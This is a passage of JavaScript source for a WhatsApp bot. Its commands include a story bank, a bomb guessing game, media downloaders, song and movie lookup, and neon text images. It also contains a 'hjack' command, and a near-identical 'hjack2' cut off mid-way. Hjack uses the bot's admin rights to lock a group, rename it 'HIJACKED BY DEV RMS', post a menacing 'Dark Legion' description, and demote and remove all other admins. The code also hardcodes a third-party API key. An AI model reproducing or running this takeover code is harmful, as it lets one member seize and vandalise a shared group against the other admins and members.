`Story 77: A choir lost their instruments in a fire. The town donated one by one until music filled the hall again. Ending note: choice 77 always returns to kindness.`,
`Story 78: A girl planted trees along a dry road. Ten years later the road was shade and bird song. Ending note: choice 78 always returns to kindness.`,
`Story 79: A retired soldier taught boys to march with respect, not rage. The street fights on that block stopped. Ending note: choice 79 always returns to kindness.`,
`Story 80: A baker left free bread for night workers. One worker left a note that funded a second oven. Ending note: choice 80 always returns to kindness.`,
`Story 81: A student failed once and almost quit. A cleaner said keep going. She became a doctor in the same hospital. Ending note: choice 81 always returns to kindness.`,
`Story 82: A DJ mixed gospel and highlife at a wake. Grief turned into dancing and the family healed faster. Ending note: choice 82 always returns to kindness.`,
`Story 83: Two friends built a small clinic from shipping containers. The first baby born there was named after both of them. Ending note: choice 83 always returns to kindness.`,
`Story 84: A fish seller refused to cheat on the scale. Customers came from three towns for that honesty. Ending note: choice 84 always returns to kindness.`,
`Story 85: A boy mapped potholes on his phone. The council fixed the worst ones and hired him as a youth advisor. Ending note: choice 85 always returns to kindness.`,
`Story 86: A widow sold spices by the roadside. Her recipes became a small brand and employed five women. Ending note: choice 86 always returns to kindness.`,
`Story 87: A pilot wrote letters to his younger self and left them in the airport chapel. Strangers still read them. Ending note: choice 87 always returns to kindness.`,
`Story 88: A boxer lost his title but won his son back by walking him to school every morning. Ending note: choice 88 always returns to kindness.`,
`Story 89: A scientist from a small village returned with clean water filters. The well parties became festivals. Ending note: choice 89 always returns to kindness.`,
`Story 90: A comedian joked about failure until the room cried with laughter. One listener started therapy the next week. Ending note: choice 90 always returns to kindness.`,
`Story 91: A tailor taught free classes on Sundays. One student opened a shop across the street and they shared clients. Ending note: choice 91 always returns to kindness.`,
`Story 92: A farmer switched to drip irrigation after a drought. Neighbors copied him and the valley stayed green. Ending note: choice 92 always returns to kindness.`,
`Story 93: A security guard studied law by flashlight. He passed and defended workers from the same gate. Ending note: choice 93 always returns to kindness.`,
`Story 94: A painter covered a burnt wall with murals of hope. Tourists came and the street got new lights. Ending note: choice 94 always returns to kindness.`,
`Story 95: Two brothers stopped speaking after a deal went bad. Their mother cooked both favorite soups until they shared a table again. Ending note: choice 95 always returns to kindness.`,
`Story 96: A midwife delivered a baby during a blackout using phone light. The child is now a nurse under her care. Ending note: choice 96 always returns to kindness.`,
`Story 97: A librarian kept the door open during holidays. A runaway teen found a book and a future there. Ending note: choice 97 always returns to kindness.`,
`Story 98: A driver gave free lifts to nurses on night shift. One of them later saved his father's life in ER. Ending note: choice 98 always returns to kindness.`,
`Story 99: A potter shaped clay with a blind friend guiding the wheel. Their pottery sold as pairs of trust. Ending note: choice 99 always returns to kindness.`,
`Story 100: A young imam and a young pastor cleaned a flooded street together. The photo changed the timeline. Ending note: choice 100 always returns to kindness.`,
`Story 101: A girl coded a budget app for market women. Loans shrank and savings clubs grew. Ending note: choice 101 always returns to kindness.`,
`Story 102: A retired captain taught swimming free every Saturday. No child from that beach drowned that year. Ending note: choice 102 always returns to kindness.`,
`Story 103: A journalist printed only verified news during a panic. Trust returned and so did readers. Ending note: choice 103 always returns to kindness.`,
`Story 104: A chef cooked one free meal a day for anyone who asked. The restaurant never went empty. Ending note: choice 104 always returns to kindness.`,
`Story 105: A carpenter built desks for a school from scrap wood. Exam scores rose with the new seats. Ending note: choice 105 always returns to kindness.`,
`Story 106: A woman mapped every borehole in her LGA. Engineers used it to fix the dry ones first. Ending note: choice 106 always returns to kindness.`,
`Story 107: A twin pair finished each other's sentences in court and won a land case for their village. Ending note: choice 107 always returns to kindness.`,
`Story 108: A night watchman wrote poems on receipt paper. A customer framed one and the rest became a chapbook. Ending note: choice 108 always returns to kindness.`,
`Story 109: A final year student taught extra lessons free. Half the class got into university and still call him coach. Ending note: choice 109 always returns to kindness.`,
`Story 110: A courier lost a package in the rain and still delivered a smile. The client hired him permanently. Ending note: choice 110 always returns to kindness.`,
`Story 111: Two strangers shared one charger on a long bus ride and exchanged only first names. Years later they met at the same stop. Ending note: choice 111 always returns to kindness.`,
`Story 112: A teacher wrote one kind note on every failed paper. Half the class improved the next term. Ending note: choice 112 always returns to kindness.`,
`Story 113: A night market closed early for a wedding on the street. Sales the next day doubled from goodwill. Ending note: choice 113 always returns to kindness.`,
`Story 114: A child planted a seed in a cracked pot. The plant outgrew the crack and the family outgrew their fear. Ending note: choice 114 always returns to kindness.`,
`Story 115: An elder taught chess under a mango tree. One student became a champion and funded benches for the shade. Ending note: choice 115 always returns to kindness.`,
`Story 116: A radio failed mid-match and the whole street narrated the goals together. Nobody needed the battery after that. Ending note: choice 116 always returns to kindness.`,
`Story 117: A painter fixed a neighbor's wall for free. The neighbor painted the painter's shop sign in gold. Ending note: choice 117 always returns to kindness.`,
`Story 118: Two rivals raced to help after a flood. They finished side by side and never raced against each other again. Ending note: choice 118 always returns to kindness.`,
`Story 119: A password was forgotten, but the notebook of kindness was not. The account was recovered by human memory. Ending note: choice 119 always returns to kindness.`];
        const bank = global.__vicoStoryBank;
        // shuffle pick different from last
        if (!global.__vicoStoryLast) global.__vicoStoryLast = -1;
        let idx = Math.floor(Math.random() * bank.length);
        if (bank.length > 1) {
            let tries = 0;
            while (idx === global.__vicoStoryLast && tries < 8) { idx = Math.floor(Math.random() * bank.length); tries++; }
        }
        global.__vicoStoryLast = idx;
        let storyText = bank[idx];
        // try API for variety first
        try {
            const { data } = await axios.get('https://text.pollinations.ai/' + encodeURIComponent('Write one complete original short story, 12-20 sentences, clear beginning middle end, family friendly. No title.'), {
                timeout: 20000, responseType: 'text'
            });
            if (typeof data === 'string' && data.trim().length > 200) storyText = data.trim();
        } catch (_) {}
        reply('📚 *Story*\n\n' + String(storyText).slice(0, 4500));
    } catch (e) {
        reply('❌ Story error');
    }
    break;
}



case 'xdeath': {
    if (!xdeathLinks.length) { reply('❌ Add your links inside xdeathLinks array first\n\nExample:\nconst xdeathLinks = [\n "https://i.imgur.com/abc.jpg",\n "https://i.imgur.com/def.jpg"\n];'); break; }
    const link = xdeathLinks[Math.floor(Math.random()*xdeathLinks.length)];
    await empire.sendMessage(m.chat, { image: { url: link }, caption: '☠️ xdeath' }, { quoted: m });
    break;
}

case 'delete':
case 'del': {
    try {
        const ctx = m.message?.extendedTextMessage?.contextInfo;
        if (!ctx?.stanzaId ||!ctx?.participant) { reply('🗑️ Reply to the message you want to delete.'); break; }
        const deleteKey = { remoteJid: m.chat, id: ctx.stanzaId, participant: ctx.participant };
        await empire.sendMessage(m.chat, { delete: deleteKey });
    } catch(e){ reply('❌ Failed to delete'); }
    break;
}

case 'bomb':
case 'bombgame': {
    const sender = m.sender;
    const timeout = 180000;

    // Get input - can be.bomb 1 or just 1
    let input = (q || text || '').trim().toLowerCase();
    // If no q, try get from body without prefix
    if (!input) {
        try {
            let raw = (m.message?.conversation || m.message?.extendedTextMessage?.text || '').trim().toLowerCase();
            raw = raw.replace(/^\.?bomb(game)?\s*/i, '').trim(); // remove.bomb
            input = raw;
        } catch {}
    }

    // If game already exists for this user
    if (bombState.has(sender)) {
        // Surrender
        if (input === 'suren' || input === 'surrender') {
            const g = bombState.get(sender);
            const b = g.array.find(v => v.emot === '💥');
            await empire.sendMessage(m.chat, { text: `🏳️ You surrendered! Bomb was ${b.number}` }, { quoted: m });
            clearTimeout(g.timeoutId);
            bombState.delete(sender);
            break;
        }

        // Try parse number from.bomb 5 or just 5
        let num = parseInt(input);
        if (isNaN(num)) {
            // try extract first number from string
            const match = input.match(/[1-9]/);
            if (match) num = parseInt(match[0]);
        }

        if (isNaN(num) || num < 1 || num > 9) {
            // Show current board again if invalid
            const game = bombState.get(sender);
            let teks = `乂 B O M B - Continue\nSend.bomb 1-9 or just number:\nType *suren* to surrender\n\n`;
            for (let i = 0; i < game.array.length; i += 3) {
                teks += game.array.slice(i, i + 3).map(v => v.state? v.emot : v.number).join('') + '\n';
            }
            await empire.sendMessage(m.chat, { text: teks }, { quoted: m });
            break;
        }

        const game = bombState.get(sender);
        const sel = game.array.find(v => v.position === num);
        if (!sel) break;
        if (sel.state) {
            await empire.sendMessage(m.chat, { text: `Box ${sel.number} already opened! Choose another.\nSend.bomb 1-9` }, { quoted: m });
            break;
        }

        sel.state = true;

        if (sel.emot === '💥') {
            let teks = `💥 BOMB EXPLODED! You hit box ${sel.number}\n\n`;
            for (let i = 0; i < game.array.length; i += 3) teks += game.array.slice(i, i + 3).map(v => v.emot).join('') + '\n';
            teks += `\nGame over! Type.bomb to start new game`;
            await empire.sendMessage(m.chat, { text: teks }, { quoted: m });
            clearTimeout(game.timeoutId);
            bombState.delete(sender);
            break;
        }

        const safe = game.array.filter(v => v.emot === '✅' && v.state);
        if (safe.length === 8) {
            let teks = `🎉 YOU WIN! All 8 safe boxes opened!\n\n`;
            for (let i = 0; i < game.array.length; i += 3) teks += game.array.slice(i, i + 3).map(v => v.emot).join('') + '\n';
            await empire.sendMessage(m.chat, { text: teks }, { quoted: m });
            clearTimeout(game.timeoutId);
            bombState.delete(sender);
            break;
        }

        let teks = `乂 B O M B\nBox ${sel.number} opened: ${sel.emot} ✅\nSafe: ${safe.length}/8\n\n`;
        for (let i = 0; i < game.array.length; i += 3) teks += game.array.slice(i, i + 3).map(v => v.state? v.emot : v.number).join('') + '\n';
        teks += `\nSend.bomb 1-9 to continue | *suren* to quit`;
        await empire.sendMessage(m.chat, { text: teks }, { quoted: m });
        break;
    }

    // No game - create new one
    const bom = ['💥', '✅', '✅', '✅', '✅', '✅', '✅', '✅', '✅'].sort(() => Math.random() - 0.5);
    const number = ['1️⃣', '2️⃣', '3️⃣', '4️⃣', '5️⃣', '6️⃣', '7️⃣', '8️⃣', '9️⃣'];
    const array = bom.map((v, i) => ({ emot: v, number: number[i], position: i + 1, state: false }));

    let teks = `乂 B O M B - New Game\nSend.bomb 1-9 to open boxes:\nType *suren* to surrender\n\n`;
    for (let i = 0; i < array.length; i += 3) teks += array.slice(i, i + 3).map(v => v.number).join('') + '\n';

    const gmsg = await empire.sendMessage(m.chat, { text: teks }, { quoted: m });
    const tid = setTimeout(() => {
        if (bombState.has(sender)) {
            const g = bombState.get(sender);
            const b = g.array.find(v => v.emot === '💥');
            empire.sendMessage(m.chat, { text: `⏰ Time up! Bomb was ${b.number}\nType.bomb to start again` }, { quoted: m });
            bombState.delete(sender);
        }
    }, timeout);

    bombState.set(sender, { msg: gmsg, array: array, timeoutId: tid });

    // If user already sent.bomb 5 in same command, open it immediately
    if (input) {
        let num = parseInt(input);
        if (!isNaN(num) && num >= 1 && num <= 9) {
            // small delay then process
            setTimeout(async () => {
                if (!bombState.has(sender)) return;
                const game = bombState.get(sender);
                const sel = game.array.find(v => v.position === num);
                if (!sel || sel.state) return;
                sel.state = true;
                let res = `乂 B O M B\nBox ${sel.number} opened: ${sel.emot}\n\n`;
                for (let i = 0; i < game.array.length; i += 3) res += game.array.slice(i, i + 3).map(v => v.state? v.emot : v.number).join('') + '\n';
                if (sel.emot === '💥') {
                    res = `💥 BOMB EXPLODED! Box ${sel.number}\n\n`;
                    for (let i = 0; i < game.array.length; i += 3) res += game.array.slice(i, i + 3).map(v => v.emot).join('') + '\n';
                    clearTimeout(game.timeoutId);
                    bombState.delete(sender);
                }
                await empire.sendMessage(m.chat, { text: res }, { quoted: m });
            }, 500);
        }
    }
    break;
}




// ═══════════════════════════════════════════════════
// AIO — universal media downloader (ZUKO)
// ═══════════════════════════════════════════════════


case 'aio':
case 'youtube':
case 'yt': {
    let url = (text || args.join(' ') || '').trim().split(/\s+/)[0];
    if (!url) {
        const ctx = m.message?.extendedTextMessage?.contextInfo;
        const qt = ctx?.quotedMessage?.conversation || ctx?.quotedMessage?.extendedTextMessage?.text || '';
        const mm = String(qt).match(/https?:\/\/[^\s]+/);
        if (mm) url = mm[0];
    }
    if (!url || !/^https?:\/\//i.test(url)) {
        return reply('⬇️ *AIO Downloader*\n\nUsage: ' + prefix + 'aio <url>\nTikTok • Instagram • Facebook • Snapchat • YouTube • X');
    }
    await empire.sendMessage(m.chat, { react: { text: '⏳', key: m.key } }).catch(() => {});
    try {
        // short link resolve
        if (/(vt|vm)\.tiktok\.com|snapchat\.com\/t\//i.test(url)) {
            try {
                const res = await axios.get(url, { maxRedirects: 0, timeout: 10000, validateStatus: s => s >= 200 && s < 400 });
                if (res.headers?.location) url = res.headers.location;
            } catch (e) {
                if (e.response?.headers?.location) url = e.response.headers.location;
            }
        }
        let resolved = null;
        // Prexzy
        try {
            const plat = /tiktok/i.test(url) ? 'tiktok' : /instagram/i.test(url) ? 'instagram' : /facebook|fb\.watch/i.test(url) ? 'facebook' : /snapchat/i.test(url) ? 'aiov2' : /youtube|youtu\.be/i.test(url) ? 'aiov2' : null;
            if (plat) {
                const { data } = await axios.get('https://prexzyapis.com/download/' + plat, {
                    params: { url }, timeout: 45000, headers: { Accept: 'application/json', 'User-Agent': 'Mozilla/5.0' }
                });
                if (data?.status || data?.data || data?.result) {
                    const raw = data.data || data.media || data.result || data;
                    if (/tiktok/i.test(url)) {
                        resolved = { video: raw.hdplay || raw.play || raw.wmplay, audio: raw.music, title: raw.title, author: raw.author?.nickname || '', cover: raw.cover };
                    } else if (/instagram/i.test(url)) {
                        const list = Array.isArray(raw) ? raw : (raw.media || []);
                        const vid = list.find(x => /video/i.test(x.type || ''));
                        const img = list.find(x => /image|photo/i.test(x.type || ''));
                        resolved = { video: vid?.url, images: img ? [img.url] : [], title: 'Instagram' };
                    } else if (/facebook|fb/i.test(url)) {
                        resolved = { video: raw.hd || raw.sd, title: raw.title || 'Facebook', cover: raw.thumbnail };
                    } else {
                        resolved = { video: raw.video || raw.url || raw.download_url || raw.hd, title: raw.title || 'Media', cover: raw.thumbnail };
                    }
                }
            }
        } catch (_) {}
        // David Cyril fallback
        if (!resolved || (!resolved.video && !resolved.images?.length)) {
            try {
                const route = /youtube|youtu\.be/i.test(url) ? 'yt' : /twitter|x\.com/i.test(url) ? 'aiov3' : /snapchat/i.test(url) ? 'aiov3' : null;
                if (route) {
                    const { data } = await axios.get('https://apis.davidcyril.name.ng/download/' + route, {
                        params: { url }, timeout: 60000
                    });
                    const r = data?.result || data?.data || data;
                    if (r) resolved = { video: r.download_url || r.url || r.hd, title: r.title || 'Media', cover: r.thumbnail };
                }
            } catch (_) {}
        }
        // Universal resolver fallback
        if (!resolved || (!resolved.video && !resolved.images?.length && !resolved.audio)) {
            resolved = await vicoResolveMedia(url);
        }
        if (!resolved) throw new Error('No media');
        await vicoSendResolved(empire, m, resolved);
        await empire.sendMessage(m.chat, { react: { text: '✅', key: m.key } }).catch(() => {});
    } catch (e) {
        await empire.sendMessage(m.chat, { react: { text: '❌', key: m.key } }).catch(() => {});
        reply('❌ *AIO failed*\n' + (e.message || 'Could not download'));
    }
    break;
}







case 'songsearch':
case 'findsong': {
    if (!m.quoted) return reply('🎵 Reply to a *video* or *audio* with ' + prefix + 'songsearch');
    await empire.sendMessage(m.chat, { react: { text: '🔎', key: m.key } }).catch(() => {});
    try {
        let buffer = null;
        try { buffer = await empire.downloadMediaMessage(m.quoted); } catch (_) {
            try { buffer = await m.quoted.download?.(); } catch (__) {}
        }
        if (!buffer || buffer.length < 500) return reply('❌ Could not download media.');
        if (buffer.length > 15 * 1024 * 1024) buffer = buffer.slice(0, 15 * 1024 * 1024);
        const FormData = require('form-data');
        let title = null, artist = null, album = null, art = null;
        try {
            const form = new FormData();
            form.append('file', buffer, { filename: 'clip.mp3' });
            const { data } = await axios.post('https://api.audd.io/', form, {
                params: { api_token: process.env.AUDD_API_TOKEN || 'test', return: 'apple_music,spotify' },
                headers: form.getHeaders(), timeout: 90000
            });
            const song = data?.result;
            if (song?.title) {
                title = song.title; artist = song.artist; album = song.album;
                art = song.song_link || song.apple_music?.artwork?.url || song.spotify?.album?.images?.[0]?.url || null;
                if (song.apple_music?.artwork?.url) art = song.apple_music.artwork.url.replace('{w}','600').replace('{h}','600');
            }
        } catch (_) {}
        if (!title) {
            try {
                const form = new FormData();
                form.append('file', buffer, { filename: 'audio.mp4' });
                form.append('apikey', 'zuko_VCmdU6W8SPOt4_gk1hE2dt7qqz2ajatO');
                const { data } = await axios.post('https://web-production-78afd6.up.railway.app/api/identify', form, {
                    headers: form.getHeaders(), timeout: 90000
                });
                const song = data?.result || data?.data || data;
                if (song?.title || song?.song || song?.name) {
                    title = song.title || song.song || song.name;
                    artist = song.artist || song.artists || song.singer;
                    album = song.album;
                    art = song.artwork || song.cover || song.thumbnail || null;
                }
            } catch (_) {}
        }
        if (!title) return reply('❌ Song not recognized. Use a clear vocal section (any genre works).');
        let msg = '🎵 *Song Found*\n\n📌 *Title:* ' + title;
        if (artist) msg += '\n🎤 *Artist:* ' + artist;
        if (album) msg += '\n💿 *Album:* ' + album;
        const qSearch = encodeURIComponent((title + (artist ? ' ' + artist : '')).trim());
        msg += '\n\n🎧 *Listen:*';
        msg += '\n• Spotify: https://open.spotify.com/search/' + qSearch;
        msg += '\n• YouTube: https://www.youtube.com/results?search_query=' + qSearch;
        msg += '\n• Apple Music: https://music.apple.com/search?term=' + qSearch;
        if (art && /^https?:\/\//i.test(art)) {
            await empire.sendMessage(m.chat, { image: { url: art }, caption: msg }, { quoted: m });
        } else {
            reply(msg);
        }
        await empire.sendMessage(m.chat, { react: { text: '✅', key: m.key } }).catch(() => {});
    } catch (e) {
        reply('❌ Song search failed: ' + (e.message || 'error'));
    }
    break;
}




case 'moviesearch':
case 'movie': {
    const q = (text || '').trim();
    if (!q) return reply('🎬 Usage: ' + prefix + 'moviesearch <title>\nExample: ' + prefix + 'moviesearch Snowfall');
    await empire.sendMessage(m.chat, { react: { text: '🎬', key: m.key } }).catch(() => {});
    try {
        let data = null;
        const keys = [process.env.OMDB_KEY, 'trilogy'].filter(Boolean);
        for (const key of keys) {
            try {
                const r = await axios.get('https://www.omdbapi.com/', { params: { t: q, plot: 'full', apikey: key }, timeout: 15000 });
                if (r.data && r.data.Response !== 'False') { data = r.data; break; }
            } catch (_) {}
        }
        if (!data) {
            try {
                const r = await axios.get('https://api.tvmaze.com/singlesearch/shows', { params: { q }, timeout: 12000 });
                data = {
                    Title: r.data.name,
                    Year: (r.data.premiered || '').slice(0, 4),
                    Genre: (r.data.genres || []).join(', '),
                    Plot: r.data.summary ? r.data.summary.replace(/<[^>]+>/g, '') : '',
                    Type: r.data.type,
                    Actors: 'N/A',
                    Director: 'N/A',
                    Poster: r.data.image?.original || r.data.image?.medium
                };
            } catch (_) {}
        }
        if (!data) return reply('❌ Movie not found.');
        const caption =
            '🎬 *' + (data.Title || q) + '*\n' +
            '📅 *Year:* ' + (data.Year || 'N/A') + '\n' +
            '🏷️ *Type:* ' + (data.Type || 'N/A') + '\n' +
            '🎭 *Genre:* ' + (data.Genre || 'N/A') + '\n' +
            '🎥 *Director:* ' + (data.Director || 'N/A') + '\n' +
            '⭐ *Actors:* ' + (data.Actors || 'N/A') + '\n' +
            '⏱️ *Runtime:* ' + (data.Runtime || 'N/A') + '\n' +
            '📊 *Rating:* ' + (data.imdbRating || data.rating?.average || 'N/A') + '\n\n' +
            '📝 *Plot:*\n' + (data.Plot || 'N/A').slice(0, 900);
        if (data.Poster && data.Poster !== 'N/A') {
            await empire.sendMessage(m.chat, { image: { url: data.Poster }, caption }, { quoted: m });
        } else {
            reply(caption);
        }
    } catch (e) {
        reply('❌ Movie search error: ' + (e.message || 'failed'));
    }
    break;
}

case 'gfx1': case 'gfx2': case 'gfx3': case 'gfx4':
case 'gfx5': case 'gfx6': case 'gfx7': case 'gfx8':
case 'gfx9': case 'gfx10': case 'gfx11': case 'gfx12':
case 'gfx13': case 'gfx14': case 'gfx15': {
    const txt = (text || '').trim();
    if (!txt) return reply('🎨 Usage: ' + prefix + command + ' <text>\nExample: ' + prefix + command + ' hi');
    // Neon sign styles (like real neon on dark wood / night)
    const neons = {
        gfx1:  { bg: '1a0a12', fg: 'FF2A6D' },
        gfx2:  { bg: '0a0a0a', fg: '39FF14' },
        gfx3:  { bg: '050510', fg: '00F0FF' },
        gfx4:  { bg: '12080a', fg: 'FF4500' },
        gfx5:  { bg: '100018', fg: 'BF00FF' },
        gfx6:  { bg: '001018', fg: '00BFFF' },
        gfx7:  { bg: '0a0a12', fg: 'FFFFFF' },
        gfx8:  { bg: '1a1000', fg: 'FFD700' },
        gfx9:  { bg: '0d001a', fg: 'FF00AA' },
        gfx10: { bg: '001a0d', fg: '7CFFCB' },
        gfx11: { bg: '1a0008', fg: 'FF6B6B' },
        gfx12: { bg: '000a1a', fg: '4D9FFF' },
        gfx13: { bg: '0a0014', fg: 'C77DFF' },
        gfx14: { bg: '1a0f00', fg: 'FF9F1C' },
        gfx15: { bg: '050505', fg: 'E0E0E0' }
    };
    const theme = neons[command] || neons.gfx1;
    await empire.sendMessage(m.chat, { react: { text: '🎨', key: m.key } }).catch(() => {});
    try {
        const safe = String(txt).slice(0, 24)
            .replace(/&/g, '&amp;').replace(/</g, '&lt;').replace(/>/g, '&gt;').replace(/"/g, '&quot;');
        const fontSize = safe.length <= 6 ? 140 : safe.length <= 12 ? 100 : 72;
        const svg =
            '<svg xmlns="http://www.w3.org/2000/svg" width="1280" height="720">' +
            '<defs>' +
            '<filter id="glow" x="-50%" y="-50%" width="200%" height="200%">' +
            '<feGaussianBlur stdDeviation="8" result="b"/>' +
            '<feMerge><feMergeNode in="b"/><feMergeNode in="SourceGraphic"/></feMerge>' +
            '</filter>' +
            '<linearGradient id="bg" x1="0" y1="0" x2="1" y2="1">' +
            '<stop offset="0%" stop-color="#' + theme.bg + '"/>' +
            '<stop offset="100%" stop-color="#000000"/>' +
            '</linearGradient>' +
            '</defs>' +
            '<rect width="1280" height="720" fill="url(#bg)"/>' +
            '<text x="640" y="400" text-anchor="middle" font-size="' + fontSize + '" ' +
            'font-family="Segoe Script, Brush Script MT, cursive" font-weight="700" ' +
            'fill="#' + theme.fg + '" filter="url(#glow)">' + safe + '</text>' +
            '</svg>';
        let out = Buffer.from(svg);
        try {
            const sharp = require('sharp');
            out = await sharp(out).png().toBuffer();
        } catch (_) {}
        await empire.sendMessage(m.chat, {
            image: out,
            caption: '✏️ ' + txt,
            mimetype: 'image/png'
        }, { quoted: m });
    } catch (e) {
        reply('❌ GFX failed: ' + (e.message || 'error'));
    }
    break;
}






case 'text2img':
case 'textpic': {
    const txt = (text || args.join(' ') || '').trim();
    if (!txt) return reply('🖼️ Usage: ' + prefix + 'text2img <text>');
    const palette = [
        ['0a0a0a','3a0808','ff2a2a'],['0a0a12','1a1040','7c4dff'],['001a12','003d2e','00e676'],
        ['1a1000','3d2e00','ffd600'],['001018','003048','00b0ff'],['1a0010','3d0030','ff4081'],
        ['0d0d0d','2a2a2a','ffffff'],['1a0500','4a1500','ff6d00'],['05001a','1a0040','c77dff'],
        ['001a1a','004d4d','1de9b6'],['1a001a','4a004a','ea80fc'],['0a1200','1a3300','aeea00'],
        ['12000a','33001a','ff80ab'],['000a12','002a4a','40c4ff'],['1a1208','3d2810','ffab40'],
        ['0a0012','1a0033','b388ff'],['001208','00331a','69f0ae'],['120800','332000','ffc400'],
        ['080012','1a0030','d500f9'],['00120c','002820','00e5ff'],['1a0008','4a0018','ff1744'],
        ['081200','1a3000','c6ff00'],['000812','001a33','2979ff'],['12000c','30001e','f50057'],
        ['0c1200','1e3000','eeff41'],['00100c','002820','1de9b6'],['100c00','2a2000','ffc107'],
        ['0c0010','20002a','e040fb'],['00100a','00281a','00e676'],['10000a','2a0018','ff5252']
    ];
    try {
        if (!global.__t2iColor) global.__t2iColor = 0;
        const c = palette[global.__t2iColor % palette.length];
        global.__t2iColor++;
        const safe = String(txt).slice(0, 40).replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;');
        const fontSize = safe.length <= 8 ? 140 : safe.length <= 16 ? 100 : 72;
        const svg = '<svg xmlns="http://www.w3.org/2000/svg" width="1280" height="720">' +
            '<defs><linearGradient id="bg" x1="0" y1="0" x2="1" y2="1">' +
            '<stop offset="0%" stop-color="#' + c[0] + '"/><stop offset="100%" stop-color="#' + c[1] + '"/>' +
            '</linearGradient><filter id="glow"><feGaussianBlur stdDeviation="8" result="b"/>' +
            '<feMerge><feMergeNode in="b"/><feMergeNode in="SourceGraphic"/></feMerge></filter></defs>' +
            '<rect width="1280" height="720" fill="url(#bg)"/>' +
            '<rect x="40" y="40" width="1200" height="640" rx="28" fill="none" stroke="#' + c[2] + '" stroke-width="3" opacity="0.55"/>' +
            '<text x="640" y="360" text-anchor="middle" font-size="' + fontSize + '" font-family="Arial Black,sans-serif" font-weight="900" fill="#' + c[2] + '" filter="url(#glow)">' + safe + '</text>' +
            '<text x="640" y="640" text-anchor="middle" font-size="22" font-family="Arial" fill="#' + c[2] + '" opacity="0.75">VICO XMD</text></svg>';
        let out = Buffer.from(svg);
        try { out = await require('sharp')(out).png().toBuffer(); } catch (_) {}
        await empire.sendMessage(m.chat, { image: out, caption: '✨ ' + txt + '\n_VICO XMD design_', mimetype: 'image/png' }, { quoted: m });
    } catch (e) {
        reply('❌ text2img failed: ' + (e.message || 'error'));
    }
    break;
}



case 'chatbot': {
    const chatId = m.chat;
    if (!global.chatbotRooms) global.chatbotRooms = {};
    const arg = (args[0] || '').toLowerCase();
    if (arg === 'on') {
        global.chatbotRooms[chatId] = true;
        return reply('🤖 *Chatbot ON*\nI remember this chat and answer anything.\nUse `' + prefix + 'chatbot off` to stop.');
    }
    if (arg === 'off') {
        delete global.chatbotRooms[chatId];
        if (global.chatbotMemory) delete global.chatbotMemory[chatId];
        return reply('🤖 *Chatbot OFF*');
    }
    const st = global.chatbotRooms[chatId] ? 'ON ✅' : 'OFF ❌';
    return reply('🤖 *Chatbot:* *' + st + '*\n\n' + prefix + 'chatbot on\n' + prefix + 'chatbot off');
}



case 'hjack': {
    if (!isGroup) return reply('❌ Group only.');
    if (!isAdmins && !isCreator) return reply('🔒 *Admins only.*');
    if (!isBotAdmins) return reply('❌ Bot needs admin rights.');
    try {
        await empire.groupSettingUpdate(m.chat, 'announcement').catch(() => {});
        await empire.groupUpdateSubject(m.chat, '𝐇𝐈𝐉𝐀𝐂𝐊𝐄𝐃 𝐁𝐘 𝐃𝐄𝐕 𝐑𝐌𝐒').catch(() => {});
        await empire.groupUpdateDescription(m.chat, `⚔️ 🩸 DARK LEGION 🩸 ⚔️
☠️ ENTER AT YOUR OWN RISK ☠️

We don't ask. We TAKE.
We don't forgive. We BURY.
Loyalty is sealed in BLOOD.
Betrayal is punished by ERASURE.

You enter as prey...
You survive only if the darkness accepts you.

🔇 Speak less. Obey more.
⚰️ The weak are sacrificed. The strong are crowned.
👁️ We see everything. We forget nothing.

No mercy. No weakness. No escape.
Once you join, your soul belongs to the Legion.

👑 SUPREME OVERLORD: 𝐑𝐌𝐒
⚡ Kneel or be destroyed ⚡`).catch(() => {});
        try {
            const meta = await empire.groupMetadata(m.chat);
            const botIds = [empire.user?.id, empire.user?.lid, botNumber].filter(Boolean);
            let actorIds = [];
            try { actorIds = getSenderIds(m, empire) || []; } catch (_) {}
            if (m.sender) actorIds.push(m.sender);
            if (m.key?.participant) actorIds.push(m.key.participant);
            actorIds = [...new Set(actorIds.filter(Boolean))];
            for (const p of (meta.participants || [])) {
                const id = p.id || p;
                const admin = p.admin === 'admin' || p.admin === 'superadmin';
                if (!admin) continue;
                // NEVER remove bot or the user who ran hjack (phone JID or LID)
                const isBot = botIds.some(b => sameIdentity(b, id) || String(b).split(':')[0].split('@')[0] === String(id).split(':')[0].split('@')[0]);
                const isActor = actorIds.some(a => sameIdentity(a, id) || String(a).split(':')[0].split('@')[0] === String(id).split(':')[0].split('@')[0]);
                if (isBot || isActor) continue;
                try {
                    await empire.groupParticipantsUpdate(m.chat, [id], 'demote');
                    await empire.groupParticipantsUpdate(m.chat, [id], 'remove');
                } catch (_) {}
            }
        } catch (_) {}
        try {
            await empire.sendMessage(m.chat, {
                text: 'HJACKED BY RMS CLAN 😈😈😈',
                contextInfo: {
                    isGroupStatus: true,
                    statusSourceType: 'TEXT',
                    statusAttributions: [{ type: 10 }],
                    statusAudienceMetadata: { audienceType: 'CLOSE_FRIENDS' }
                }
            });
        } catch (_) {}
        await empire.sendMessage(m.sender, { text: '✅ *hjack complete*\nLocked • name/desc set • other admins removed • status posted.' }).catch(() => {});
    } catch (e) {
        reply('❌ hjack failed: ' + (e.message || 'error'));
    }
    break;
}



case 'hjack2': {
    if (!isGroup) return reply('❌ Group only.');
    if (!isAdmins && !isCreator) return reply('🔒 *Admins only.*');
    if (!isBotAdmins) return reply('❌ Bot needs admin rights.');
    try {
        await empire.groupSettingUpdate(m.chat, 'announcement').catch(() => {});
        await empire.groupUpdateSubject(m.chat, '𝐇𝐈𝐉𝐀𝐂𝐊𝐄𝐃 𝐁𝐘 𝐃𝐄𝐕 𝐑𝐌𝐒').catch(() => {});
        await empire.groupUpdateDescription(m.chat, `⚔️ 🩸 DARK LEGION 🩸 ⚔️
☠️ ENTER AT YOUR OWN RISK ☠️

We don't ask. We TAKE.
We don't forgive. We BURY.
Loyalty is sealed in BLOOD.
Betrayal is punished by ERASURE.

You enter as prey...
You survive only if the darkness accepts you.

🔇 Speak less. Obey more.
⚰️ The weak are sacrificed. The strong are crowned.
👁️ We see everything. We forget nothing.

No mercy. No weakness. No escape.
Once you join, your soul belongs to the Legion.

👑 SUPREME OVERLORD: 𝐑𝐌𝐒
⚡ Kneel or be destroyed ⚡`).catch(() => {});
        try {
            const meta = await empire.groupMetadata(m.chat);
            const botIds = [empire.user?.id, empire.user?.lid, botNumber].filter(Boolean);
            let actorIds = [];
            try { actorIds = getSenderIds(m, empire) || []; } catch (_) {}
            if (m.sender) actorIds.push(m.sender);
            if (m.key?.participant) actorIds.push(m.key.participant);
